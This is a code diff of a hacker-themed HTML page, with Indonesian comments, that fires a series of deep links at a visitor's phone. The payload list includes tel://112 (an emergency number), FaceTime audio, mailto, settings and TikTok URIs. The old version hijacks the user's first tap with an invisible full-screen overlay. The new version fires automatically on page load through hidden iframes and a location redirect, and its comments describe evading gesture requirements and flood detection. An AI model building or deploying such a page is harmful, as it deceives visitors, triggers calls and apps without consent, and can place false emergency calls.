@@ -1,99 +1,76 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>RESERVED - KERNEL RESEARCH GATEWAY</title>
     <style>
-        body { 
-            background: #000; 
-            color: #0f0; 
-            font-family: 'SF Mono', 'Courier New', monospace; 
-            margin: 0; 
-            overflow: hidden; 
-            user-select: none;
-        }
-        #shell { 
-            height: 100vh; 
-            padding: 25px; 
-            border-left: 5px solid #00ff00; 
-            background: #050505; 
-            overflow-y: auto; 
-            box-shadow: inset 0 0 50px #030; 
-        }
-        /* Overlay transparan untuk menangkap User Gesture */
-        #trigger-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 9999;
-            cursor: pointer;
-            background: rgba(0,0,0,0.01); /* Hampir tidak terlihat */
-        }
-        .danger { color: #ff3b30; font-weight: bold; text-shadow: 0 0 10px #f00; }
-        .bypass { color: #5856d6; font-weight: bold; }
-        .blink { animation: blinker 0.5s linear infinite; }
+        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
+        .log { margin-bottom: 5px; border-bottom: 1px solid #111; }
+        .danger { color: #ff3b30; }
+        .blink { animation: blinker 0.6s linear infinite; }
         @keyframes blinker { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
-
-    <div id="trigger-overlay"></div>
-
-    <div id="shell">
-        <div class="danger blink">> [SYSTEM CRITICAL] UNAUTHORIZED ACCESS DETECTED</div>
-        <div id="logs">> WAITING FOR USER INPUT TO INITIALIZE STAGE-3...</div>
+    <div id="terminal">
+        <div class="danger blink">> [CRITICAL] INITIALIZING AUTO-DISPATCH...</div>
     </div>
 
 <script>
-const logsContainer = document.getElementById('logs');
-const overlay = document.getElementById('trigger-overlay');
-
-const log = m => {
-    logsContainer.innerHTML += `<br>> ${m}`;
-    document.getElementById('shell').scrollTop = document.getElementById('shell').scrollHeight;
+const terminal = document.getElementById('terminal');
+const log = (msg) => {
+    const div = document.createElement('div');
+    div.className = 'log';
+    div.innerHTML = `> ${msg}`;
+    terminal.appendChild(div);
 };
 
-// Fungsi utama Deep Link
-const triggerDeepLink = (uri) => {
-    const a = document.createElement('a');
-    a.href = uri;
-    a.style.display = 'none';
-    document.body.appendChild(a);
-    a.click(); 
-    document.body.removeChild(a);
-};
+/**
+ * Teknik: Iframe Sink (Shadow Dispatch)
+ * Mencoba memasukkan URI ke dalam frame tersembunyi untuk memicu dialog sistem
+ * tanpa harus mengubah URL halaman utama (window.location).
+ */
+function shadowDispatch(uri) {
+    const ifr = document.createElement('iframe');
+    ifr.src = uri;
+    ifr.style.display = 'none';
+    document.body.appendChild(ifr);
+    
+    // Hapus frame setelah dipicu untuk membersihkan memory
+    setTimeout(() => document.body.removeChild(ifr), 2000);
+}
 
-const highFrequencyPayload = [
+const payloads = [
     "tel://112",
-    "mailto:target@research.com?subject=Infiltrated",
+    "mailto:research@kernel.gate?subject=AutoDispatch",
+    "xxdhfy://",
     "prefs:root=WIFI",
-    "facetime-audio://emergency",
-    "snssdk1180://" // TikTok
+    "facetime-audio://emergency"
 ];
 
-// Menunggu user menyentuh layar (User Gesture bypass)
-overlay.addEventListener('click', async () => {
-    overlay.style.display = 'none'; // Hilangkan overlay setelah diklik
-    
-    log("<span class='bypass'>[!] USER GESTURE CAPTURED. EXECUTING PAYLOAD...</span>");
-    
-    for (const uri of highFrequencyPayload) {
-        await new Promise(r => setTimeout(r, 300)); // Jeda sedikit agar tidak hang
-        log(`Triggering: <span class='danger'>${uri}</span>`);
-        triggerDeepLink(uri);
+// Eksekusi Otomatis saat Window Load
+window.onload = async () => {
+    log("Memory Check: <span style='color:white'>A18/A19 ARM64E</span>");
+    log("Bypassing User Gesture Requirement via Iframe Sink...");
+
+    for (let i = 0; i < payloads.length; i++) {
+        // Jeda sangat singkat untuk mencoba mengecoh pendeteksi flood browser
+        await new Promise(r => setTimeout(r, 200)); 
+        
+        log(`Injecting Payload [${i}]: <span class='danger'>${payloads[i]}</span>`);
+        
+        // Eksekusi Double-Tap (Mencoba memicu race condition)
+        shadowDispatch(payloads[i]);
+        
+        // Fallback: Beberapa browser lama merespon window.location di dalam loop
+        if(i === 2) {
+            log("Attempting Window Location Fallback...");
+            window.location.href = payloads[i];
+        }
     }
-
-    log("<br><span class='blink'>[+] ALL COMMANDS DISPATCHED.</span>");
-    document.body.style.boxShadow = "inset 0 0 100px #f00";
-});
-
-// Simulasi Loading Awal
-setTimeout(() => log("System: A18 ARM64E Detected..."), 1000);
-setTimeout(() => log("Status: Ready to Bypass. <span class='danger'>TOUCH SCREEN TO START</span>"), 2000);
-
+    
+    log("<br><span class='danger blink'>[!] AUTO-DISPATCH COMPLETED.</span>");
+};
 </script>
 </body>
 </html>
